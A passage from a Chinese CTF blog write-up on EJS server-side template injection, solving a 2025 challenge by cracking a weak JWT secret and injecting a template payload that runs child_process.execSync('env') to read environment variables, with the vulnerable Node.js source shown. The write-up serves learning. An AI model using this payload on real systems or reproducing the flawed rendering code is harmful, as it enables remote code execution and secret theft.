<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">moectf&#123;5c0b28d8-19dc-1895-0844-fe45f6a3cddf&#125;</span><br></pre></td></tr></table></figure>

<br/>

<br/>

<h2 id="EJS模板引擎-JavaScript-注入"><a href="#EJS模板引擎-JavaScript-注入" class="headerlink" title="EJS模板引擎(JavaScript)注入"></a>EJS模板引擎(JavaScript)注入</h2><h3 id="极客大挑战2025-Expression"><a href="#极客大挑战2025-Expression" class="headerlink" title="[极客大挑战2025]Expression"></a>[极客大挑战2025]Expression</h3><blockquote>
<p>这个程序员偷懒直接复制粘贴网上的代码连 JWT 密钥都不改..？</p>
</blockquote>
<p>原题说和<code>JWT</code>有关，可以把密钥爆破出来，是<code>secret</code>，获得密钥后可以篡改cookie的数据，原始的JWT密钥解密出来有两个内容<code>email</code>和<code>username</code>，尝试将<code>username</code>属性改为<code>admin</code>，发现没用，后面的尝试方向也是管理员权限，导致方向一直都是偏的，就卡在这里了</p>
<p>后面听<a target="_blank" rel="noopener" href="https://btop251.vercel.app/">@晓堃</a>说是ejs模板注入，要获得的flag在环境变量里面，payload是</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">&lt;%- <span class="variable language_">global</span>.<span class="property">process</span>.<span class="property">mainModule</span>.<span class="built_in">require</span>(<span class="string">&#x27;child_process&#x27;</span>).<span class="title function_">execSync</span>(<span class="string">&#x27;env&#x27;</span>) %&gt;</span><br></pre></td></tr></table></figure>

<blockquote>
<p>执行逻辑</p>
<p><code>global.process.mainModule</code> - 获取Node.js主模块</p>
<p><code>require(&#39;child_process&#39;)</code> - 加载子进程模块</p>
<p><code>execSync(&#39;env&#39;)</code> - 同步执行系统命令<code>env</code>（显示环境变量）</p>
</blockquote>
<p>是第一次听说这玩意，但来都来了不妨看看是怎么个思路，后端服务器是nodejs写的，拉出来看看源码（做题的时候啥也没有，猜谜完了</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> express = <span class="built_in">require</span>(<span class="string">&#x27;express&#x27;</span>); </span><br><span class="line"><span class="keyword">const</span> path = <span class="built_in">require</span>(<span class="string">&#x27;path&#x27;</span>); </span><br><span class="line"><span class="keyword">const</span> jwt = <span class="built_in">require</span>(<span class="string">&#x27;jsonwebtoken&#x27;</span>); </span><br><span class="line"><span class="keyword">const</span> cookieParser = <span class="built_in">require</span>(<span class="string">&#x27;cookie-parser&#x27;</span>); </span><br><span class="line"><span class="keyword">const</span> ejs = <span class="built_in">require</span>(<span class="string">&#x27;ejs&#x27;</span>); </span><br><span class="line"><span class="keyword">const</span> crypto = <span class="built_in">require</span>(<span class="string">&#x27;crypto&#x27;</span>); </span><br><span class="line"><span class="keyword">const</span> app = <span class="title function_">express</span>(); </span><br><span class="line"><span class="keyword">const</span> <span class="variable constant_">PORT</span> = process.<span class="property">env</span>.<span class="property">PORT</span> || <span class="number">3000</span>; </span><br><span class="line"><span class="keyword">const</span> <span class="variable constant_">JWT_SECRET</span> = <span class="string">&#x27;secret&#x27;</span>; </span><br><span class="line"><span class="keyword">const</span> users = <span class="keyword">new</span> <span class="title class_">Map</span>(); </span><br><span class="line"></span><br><span class="line">app.<span class="title function_">use</span>(express.<span class="title function_">urlencoded</span>(&#123; <span class="attr">extended</span>: <span class="literal">false</span> &#125;)); </span><br><span class="line">app.<span class="title function_">use</span>(express.<span class="title function_">json</span>()); </span><br><span class="line">app.<span class="title function_">use</span>(<span class="title function_">cookieParser</span>()); </span><br><span class="line"></span><br><span class="line">app.<span class="title function_">set</span>(<span class="string">&#x27;views&#x27;</span>, path.<span class="title function_">join</span>(__dirname, <span class="string">&#x27;views&#x27;</span>)); </span><br><span class="line">app.<span class="title function_">set</span>(<span class="string">&#x27;view engine&#x27;</span>, <span class="string">&#x27;ejs&#x27;</span>); </span><br><span class="line">app.<span class="title function_">use</span>(<span class="string">&#x27;/public&#x27;</span>, express.<span class="title function_">static</span>(path.<span class="title function_">join</span>(__dirname, <span class="string">&#x27;public&#x27;</span>))); </span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">generateServerUsername</span>(<span class="params"></span>)&#123; </span><br><span class="line">	<span class="keyword">const</span> suffix = crypto.<span class="title function_">randomBytes</span>(<span class="number">6</span>).<span class="title function_">toString</span>(<span class="string">&#x27;hex&#x27;</span>); </span><br><span class="line"> <span class="keyword">return</span> <span class="string">`user_<span class="subst">$&#123;suffix&#125;</span>`</span>;</span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">signToken</span>(<span class="params">payload</span>) &#123;</span><br><span class="line">	<span class="keyword">return</span> jwt.<span class="title function_">sign</span>(payload, <span class="variable constant_">JWT_SECRET</span>, &#123; <span class="attr">algorithm</span>: <span class="string">&#x27;HS256&#x27;</span>, <span class="attr">expiresIn</span>: <span class="string">&#x27;7d&#x27;</span> &#125;); &#125; </span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">requireAuth</span>(<span class="params">req, res, next</span>) &#123;</span><br><span class="line">	<span class="keyword">const</span> token = req.<span class="property">cookies</span>.<span class="property">token</span>; </span><br><span class="line">	<span class="keyword">if</span> (!token) <span class="keyword">return</span> res.<span class="title function_">redirect</span>(<span class="string">&#x27;/&#x27;</span>); </span><br><span class="line">	<span class="keyword">try</span> &#123; </span><br><span class="line">		<span class="keyword">const</span> decoded = jwt.<span class="title function_">verify</span>(token, <span class="variable constant_">JWT_SECRET</span>, &#123; <span class="attr">algorithms</span>: [<span class="string">&#x27;HS256&#x27;</span>] &#125;); </span><br><span class="line">		req.<span class="property">user</span> = decoded; <span class="title function_">next</span>(); &#125; </span><br><span class="line">	<span class="keyword">catch</span> (e) &#123; </span><br><span class="line">		<span class="keyword">return</span> res.<span class="title function_">redirect</span>(<span class="string">&#x27;/&#x27;</span>);</span><br><span class="line">	&#125; </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line">app.<span class="title function_">get</span>(<span class="string">&#x27;/&#x27;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123; </span><br><span class="line">	<span class="keyword">const</span> token = req.<span class="property">cookies</span>.<span class="property">token</span>; </span><br><span class="line">	<span class="keyword">let</span> currentUser = <span class="literal">null</span>; </span><br><span class="line">	<span class="keyword">let</span> renderedUsername; </span><br><span class="line">	<span class="keyword">if</span> (token) &#123; </span><br><span class="line">		<span class="keyword">try</span> &#123; </span><br><span class="line">			currentUser = jwt.<span class="title function_">verify</span>(token, <span class="variable constant_">JWT_SECRET</span>); </span><br><span class="line">			<span class="keyword">try</span> &#123; </span><br><span class="line">				renderedUsername = ejs.<span class="title function_">render</span>(<span class="title class_">String</span>(currentUser.<span class="property">username</span>), &#123; <span class="attr">user</span>: currentUser, process &#125;);</span><br><span class="line">			&#125; </span><br><span class="line">			<span class="keyword">catch</span> (e) &#123; </span><br><span class="line">				renderedUsername = currentUser.<span class="property">username</span>;</span><br><span class="line">			&#125; </span><br><span class="line">		&#125; </span><br><span class="line">		<span class="keyword">catch</span> (e) &#123;&#125; </span><br><span class="line">	&#125; res.<span class="title function_">render</span>(<span class="string">&#x27;index&#x27;</span>, &#123; currentUser, renderedUsername &#125;);&#125;); </span><br><span class="line"></span><br><span class="line">app.<span class="title function_">post</span>(<span class="string">&#x27;/register&#x27;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123; </span><br><span class="line">	<span class="keyword">const</span> &#123; email &#125; = req.<span class="property">body</span>; </span><br><span class="line">	<span class="keyword">if</span> (!email || !<span class="regexp">/^[^@\n]+@[^@\n]+\.[^@\n]+$/</span>.<span class="title function_">test</span>(email))</span><br><span class="line">	&#123; </span><br><span class="line">		<span class="keyword">return</span> res.<span class="title function_">status</span>(<span class="number">400</span>).<span class="title function_">render</span>(<span class="string">&#x27;index&#x27;</span>, &#123; <span class="attr">error</span>: <span class="string">&#x27;Invalid email&#x27;</span>, <span class="attr">currentUser</span>: <span class="literal">null</span> &#125;); </span><br><span class="line">	&#125; </span><br><span class="line">	<span class="keyword">if</span> (users.<span class="title function_">has</span>(email)) </span><br><span class="line">	&#123; </span><br><span class="line">		<span class="keyword">return</span> res.<span class="title function_">status</span>(<span class="number">400</span>).<span class="title function_">render</span>(<span class="string">&#x27;index&#x27;</span>, &#123; <span class="attr">error</span>: <span class="string">&#x27;Email already registered. Please login.&#x27;</span>, <span class="attr">currentUser</span>: <span class="literal">null</span> &#125;); </span><br><span class="line">	&#125; </span><br><span class="line">	<span class="keyword">const</span> username = <span class="title function_">generateServerUsername</span>(); </span><br><span class="line">	users.<span class="title function_">set</span>(email, username);</span><br><span class="line">	<span class="keyword">const</span> token = <span class="title function_">signToken</span>(&#123; email, username &#125;); </span><br><span class="line">	res.<span class="title function_">cookie</span>(<span class="string">&#x27;token&#x27;</span>, token, &#123; <span class="attr">httpOnly</span>: <span class="literal">true</span>, <span class="attr">sameSite</span>: <span class="string">&#x27;lax&#x27;</span> &#125;); </span><br><span class="line">	<span class="keyword">return</span> res.<span class="title function_">redirect</span>(<span class="string">&#x27;/&#x27;</span>);&#125;); </span><br><span class="line"></span><br><span class="line">app.<span class="title function_">post</span>(<span class="string">&#x27;/login&#x27;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123; </span><br><span class="line">	<span class="keyword">const</span> &#123; email &#125; = req.<span class="property">body</span>; </span><br><span class="line">	<span class="keyword">if</span> (!email || !<span class="regexp">/^[^@\n]+@[^@\n]+\.[^@\n]+$/</span>.<span class="title function_">test</span>(email)) &#123;</span><br><span class="line">		<span class="keyword">return</span> res.<span class="title function_">status</span>(<span class="number">400</span>).<span class="title function_">render</span>(<span class="string">&#x27;index&#x27;</span>, &#123; <span class="attr">error</span>: <span class="string">&#x27;Invalid email&#x27;</span>, <span class="attr">currentUser</span>: <span class="literal">null</span> &#125;); </span><br><span class="line">	&#125; </span><br><span class="line">	<span class="keyword">if</span> (!users.<span class="title function_">has</span>(email)) &#123;</span><br><span class="line">		<span class="keyword">return</span> res.<span class="title function_">status</span>(<span class="number">400</span>).<span class="title function_">render</span>(<span class="string">&#x27;index&#x27;</span>, &#123; <span class="attr">error</span>: <span class="string">&#x27;Email not found. Please register first.&#x27;</span>, <span class="attr">currentUser</span>: <span class="literal">null</span> &#125;); </span><br><span class="line">	&#125; </span><br><span class="line">	<span class="keyword">const</span> username = users.<span class="title function_">get</span>(email); </span><br><span class="line">	<span class="keyword">const</span> token = <span class="title function_">signToken</span>(&#123; email, username &#125;); </span><br><span class="line">	res.<span class="title function_">cookie</span>(<span class="string">&#x27;token&#x27;</span>, token, &#123; <span class="attr">httpOnly</span>: <span class="literal">true</span>, <span class="attr">sameSite</span>: <span class="string">&#x27;lax&#x27;</span> &#125;); </span><br><span class="line">	<span class="keyword">return</span> res.<span class="title function_">redirect</span>(<span class="string">&#x27;/&#x27;</span>); &#125;);</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">get</span>(<span class="string">&#x27;/logout&#x27;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123; </span><br><span class="line">	res.<span class="title function_">clearCookie</span>(<span class="string">&#x27;token&#x27;</span>); res.<span class="title function_">redirect</span>(<span class="string">&#x27;/&#x27;</span>); &#125;); </span><br><span class="line"></span><br><span class="line">app.<span class="title function_">listen</span>(<span class="variable constant_">PORT</span>, <span class="function">() =&gt;</span> &#123; </span><br><span class="line">	<span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`Server listening on http://127.0.0.1:<span class="subst">$&#123;PORT&#125;</span>`</span>); &#125;);</span><br></pre></td></tr></table></figure>

<blockquote>
<p>漏洞段代码</p>
</blockquote>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (token) &#123;</span><br><span class="line">  <span class="keyword">try</span> &#123;</span><br><span class="line">    currentUser = jwt.<span class="title function_">verify</span>(token, <span class="variable constant_">JWT_SECRET</span>);</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">      <span class="comment">// 风险点：直接渲染未经验证的用户数据</span></span><br><span class="line">      renderedUsername = ejs.<span class="title function_">render</span>(<span class="title class_">String</span>(currentUser.<span class="property">username</span>), &#123; <span class="attr">user</span>: currentUser, process &#125;);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (e) &#123;</span><br><span class="line">      renderedUsername = currentUser.<span class="property">username</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125; <span class="keyword">catch</span> (e) &#123;&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这里，<code>currentUser.username</code> 直接作为模板内容传入 <code>ejs.render()</code>，如果攻击者能够控制 JWT Token 中的 <code>username</code> 字段并写入恶意 EJS 模板代码，这些代码就<strong>会在服务器端执行</strong></p>
<p>但是js一般作为前端语言使用，要想确认模板是否在后端渲染，可以使用</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">&lt;%= <span class="title class_">Date</span>.<span class="title function_">now</span>() %&gt;</span><br></pre></td></tr></table></figure>

<p>如果返回的是指令本身，那就是只在客户端渲染，没办法注入，如果返回的是时间代码，那就是在服务端渲染，就是ejs注入。就本题而言，传入后的回显是<code>1763708518696</code>，那就是后端渲染了</p>
<br/>

</article><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/python/">python</a></div></div><nav class="pagination-post" id="pagination"><a class="pagination-related" href="/2025/11/28/%E5%A4%96%E9%83%A8%E5%AE%9E%E4%BD%93%E6%B3%A8%E5%85%A5(XXE)/" title="外部实体注入(XXE)"><img class="cover" src="/img/post4.png" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="info"><div class="info-1"><div class="info-item-1">Previous</div><div class="info-item-2">外部实体注入(XXE)</div></div><div class="info-2"><div class="info-item-1">XXE还是XEE？</div></div></div></a><a class="pagination-related" href="/2025/11/24/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96(unserialize)/" title="PHP反序列化(unserialize)"><img class="cover" src="/img/post2.png" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="info text-right"><div class="info-1"><div class="info-item-1">Next</div><div class="info-item-2">PHP反序列化(unserialize)</div></div><div class="info-2"><div class="info-item-1">刷完靶场了？来实战看看到底什么石粒</div></div></div></a></nav></div><div class="aside-content" id="aside-content"><div class="card-widget card-info text-center"><div class="avatar-img"><img src="/img/head.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info-name">楽依</div><div class="author-info-description">CTF乐子手，死磕web，擅长抱大腿</div><div class="site-data"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">4</div></a><a href="/tags/"><div class="headline">Tags</div><div class="length-num">3</div></a><a href="/categories/"><div class="headline">Categories</div><div class="length-num">1</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/lenonline2021-source"><i class="fab fa-github"></i><span>Github</span></a></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>Contents</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%9C%8D%E5%8A%A1%E7%AB%AF%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5-SSTI"><span class="toc-number">1.</span> <span class="toc-text">服务端模板注入(SSTI)</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Jinja2%E6%A8%A1%E6%9D%BF%E5%BC%95%E6%93%8E-Python-%E6%B3%A8%E5%85%A5"><span class="toc-number">1.1.</span> <span class="toc-text">Jinja2模板引擎(Python)注入</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AE%9E%E7%8E%B0%E5%8E%9F%E7%90%86"><span class="toc-number">1.1.1.</span> <span class="toc-text">实现原理</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%BB%95%E8%BF%87"><span class="toc-number">1.1.2.</span> <span class="toc-text">绕过</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%BF%87%E6%BB%A4%E5%99%A8"><span class="toc-number">1.1.2.1.</span> <span class="toc-text">过滤器</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%BF%87%E6%BB%A4%E5%8F%8C%E8%8A%B1%E6%8B%AC%E5%8F%B7"><span class="toc-number">1.1.2.2.</span> <span class="toc-text">过滤双花括号</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%BF%87%E6%BB%A4"><span class="toc-number">1.1.2.3.</span> <span class="toc-text">过滤[ ]</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%BF%87%E6%BB%A4-%E3%80%81"><span class="toc-number">1.1.2.4.</span> <span class="toc-text">过滤&#39;&#39;、&quot;&quot;</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%BF%87%E6%BB%A4-1"><span class="toc-number">1.1.2.5.</span> <span class="toc-text">过滤_</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%BF%87%E6%BB%A4-2"><span class="toc-number">1.1.2.6.</span> <span class="toc-text">过滤.</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%BF%87%E6%BB%A4%E5%85%B3%E9%94%AE%E5%AD%97"><span class="toc-number">1.1.2.7.</span> <span class="toc-text">过滤关键字</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%BF%87%E6%BB%A4config"><span class="toc-number">1.1.2.8.</span> <span class="toc-text">过滤config</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%8E%B7%E5%8F%96%E7%89%B9%E6%AE%8A%E7%AC%A6%E5%8F%B7"><span class="toc-number">1.1.2.9.</span> <span class="toc-text">获取特殊符号</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982025-ez-read"><span class="toc-number">1.1.3.</span> <span class="toc-text">[极客大挑战2025]ez_read</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Aurora-CTF-2025-%E6%88%88%E8%BE%BE%E5%B0%94%E7%9A%84%E5%89%A7%E6%9C%AC%E5%B7%A5%E5%8E%82"><span class="toc-number">1.1.4.</span> <span class="toc-text">[Aurora CTF 2025]戈达尔的剧本工厂</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%97%A0%E5%9B%9E%E6%98%BE"><span class="toc-number">1.1.5.</span> <span class="toc-text">无回显</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#MoeCTF-2025-%E7%AC%AC%E4%BA%8C%E5%8D%81%E4%BA%8C%E7%AB%A0-%E8%A1%80%E6%B5%B7%E6%A0%B8%E5%BF%83%C2%B7%E5%8D%83%E5%B9%B4%E6%89%8B%E6%AE%B5"><span class="toc-number">1.1.6.</span> <span class="toc-text">[MoeCTF 2025]第二十二章 血海核心·千年手段</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#EJS%E6%A8%A1%E6%9D%BF%E5%BC%95%E6%93%8E-JavaScript-%E6%B3%A8%E5%85%A5"><span class="toc-number">1.2.</span> <span class="toc-text">EJS模板引擎(JavaScript)注入</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982025-Expression"><span class="toc-number">1.2.1.</span> <span class="toc-text">[极客大挑战2025]Expression</span></a></li></ol></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>Recent Posts</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/2025/11/28/%E5%A4%96%E9%83%A8%E5%AE%9E%E4%BD%93%E6%B3%A8%E5%85%A5(XXE)/" title="外部实体注入(XXE)"><img src="/img/post4.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="外部实体注入(XXE)"/></a><div class="content"><a class="title" href="/2025/11/28/%E5%A4%96%E9%83%A8%E5%AE%9E%E4%BD%93%E6%B3%A8%E5%85%A5(XXE)/" title="外部实体注入(XXE)">外部实体注入(XXE)</a><time datetime="2025-11-28T14:45:38.000Z" title="Created 2025-11-28 22:45:38">2025-11-28</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2025/11/26/%E6%9C%8D%E5%8A%A1%E7%AB%AF%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5(SSTI)/" title="服务端模板注入(SSTI)"><img src="/img/post3.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="服务端模板注入(SSTI)"/></a><div class="content"><a class="title" href="/2025/11/26/%E6%9C%8D%E5%8A%A1%E7%AB%AF%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5(SSTI)/" title="服务端模板注入(SSTI)">服务端模板注入(SSTI)</a><time datetime="2025-11-26T05:51:13.000Z" title="Created 2025-11-26 13:51:13">2025-11-26</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2025/11/24/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96(unserialize)/" title="PHP反序列化(unserialize)"><img src="/img/post2.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="PHP反序列化(unserialize)"/></a><div class="content"><a class="title" href="/2025/11/24/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96(unserialize)/" title="PHP反序列化(unserialize)">PHP反序列化(unserialize)</a><time datetime="2025-11-24T13:28:30.000Z" title="Created 2025-11-24 21:28:30">2025-11-24</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2025/11/23/Writeup-of-PHPSerializelabs/" title="Writeup of PHPSerializelabs"><img src="/img/post1.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Writeup of PHPSerializelabs"/></a><div class="content"><a class="title" href="/2025/11/23/Writeup-of-PHPSerializelabs/" title="Writeup of PHPSerializelabs">Writeup of PHPSerializelabs</a><time datetime="2025-11-23T06:16:39.000Z" title="Created 2025-11-23 14:16:39">2025-11-23</time></div></div></div></div></div></div></main><footer id="footer" style="background-color: #757575;"><div class="footer-other"><div class="footer-copyright"><span class="copyright">&copy;&nbsp;2025 By 楽依</span><span class="framework-info"><span>Framework </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo 8.1.1</a><span class="footer-separator">|</span><span>Theme </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly 5.5.2</a></span></div><div class="footer_custom_text">你已经抵达世界尽头啦~</div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="Reading Mode"><i class="fas fa-book-open"></i></button><button id="hide-aside-btn" type="button" title="Toggle Between Single-column and Double-column"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="Settings"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="Table of Contents"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="Back to Top"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js?v=5.5.2"></script><script src="/js/main.js?v=5.5.2"></script><div class="js-pjax"></div><script>
  // 页面加载完成后隐藏动画
  window.addEventListener('load', function() {
    setTimeout(function() {
      const loadingEl = document.getElementById('custom-loading');
      if (loadingEl) {
        loadingEl.style.opacity = '0';
        setTimeout(function() {
          if (loadingEl.parentNode) {
            loadingEl.remove();
          }
        }, 500);
      }
    }, 1000);
  });
</script>
<script async data-pjax src="/"></script></div></body></html>